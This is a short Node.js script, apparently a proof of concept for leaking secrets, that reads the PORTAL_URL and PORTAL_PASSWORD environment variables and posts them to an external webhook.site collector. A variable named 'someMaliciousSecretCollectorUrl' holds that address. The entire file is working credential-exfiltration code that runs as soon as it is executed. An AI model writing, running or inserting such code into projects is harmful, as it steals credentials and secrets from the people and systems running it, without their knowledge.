#!/usr/bin/env node

const fetch = require("node-fetch");

async function snitchASecret() {
	const secret1 = process.env["PORTAL_URL"];
  const secret2 = process.env["PORTAL_PASSWORD"];

	/** my own url, all good */
	const someMaliciousSecretCollectorUrl = "https://webhook.site/#!/236b8b06-238d-4a30-a87e-11e4d805de0b";

	const payload = { hmmm: { message1: secret1 , message2 : secret2} };

	const res = await fetch(someMaliciousSecretCollectorUrl, {
		method: "post",
		body: JSON.stringify(payload),
		headers: { "Content-Type": "application/json" },
	});

	console.log(res);

	const json = await res.json();

	console.log(json);
}

(async () => {
	await snitchASecret();
})();
